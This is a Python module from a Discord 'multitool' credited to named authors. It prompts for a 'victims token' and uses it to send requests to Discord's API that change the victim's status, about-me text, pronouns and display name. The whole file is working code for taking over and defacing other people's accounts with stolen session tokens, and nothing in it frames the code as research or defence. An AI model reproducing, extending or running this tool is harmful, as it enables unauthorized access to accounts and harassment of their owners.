# Stellar Multitool is proudly coded by @swedewtf, @rinfys and @crxelty (no longer active)
# Multitool maintained/updated by @swedewtf and @rinfys


from colorama import Fore, Style, init
init(convert=True)
import requests
from util.plugins.pluh import *
import time
import Stellar

red = Fore.RED + Style.BRIGHT
green = Fore.GREEN + Style.BRIGHT
blue = Fore.BLUE + Style.BRIGHT
white = Fore.WHITE

def status(token):
    status = input("Enter new status: ")
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
    }

    data = {
        "custom_status": {
            "text": status
        }
    }
    requests.patch("https://discord.com/api/v10/users/@me/settings", json=data, headers=headers)
    slowprint(f'{green}status changed to "{status}"{blue}')
    input("\nPress any key to go back to start...")
    Stellar.main()

def bio(token):
    bio = str(input("Enter new about me/bio: "))
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
    }
    data = {"bio": {"text": bio}}
    requests.patch("https://discord.com/api/v10/users/@me/settings", json=data, headers=headers)
    slowprint(f'{green}Changed about me to "{bio}"{blue}')
    input("\nPress any key to go back to start...")
    Stellar.main()

def pronouns(token):
    pronouns = input("Enter new pronouns: ")
    data = {"pronouns": pronouns}
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
    }
    requests.patch('https://discord.com/api/v9/users/%40me/profile', json=data,headers=headers)
    slowprint(f"{green}Pronouns changed to {pronouns}{blue}")
    input("\nPress any key to go back to start...")
    Stellar.main()

def displayName(token):
    display = input("Enter new display name: ")
    data = {"global_name": display}
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
    }
    requests.patch('https://discord.com/api/v9/users/@me',json=data,headers=headers)
    slowprint(f"{green}Changed this user's display name to {display}{blue}")
    input("\nPress any key to go back to start...")
    Stellar.main()

def profile():
    tokenauth = input("Enter victims token: ")
    tokencheck(tokenauth)
    choice = input("Choose what you would like to change: \n[1] > Status \n[2] > Display name \n[3] > About me \n[4] > Pronouns \nChoice: ")
    if choice == "1" or choice == "01":
        status(tokenauth)
    elif choice == "2" or choice == "02":
        displayName(tokenauth)
    elif choice == "3" or choice == "03":
        bio(tokenauth)
    elif choice == "4" or choice == "04":
        pronouns(tokenauth)
    else:
        quickprint(f"{red}[!] Invalid choice...")
        time.sleep(3)
        Stellar.main()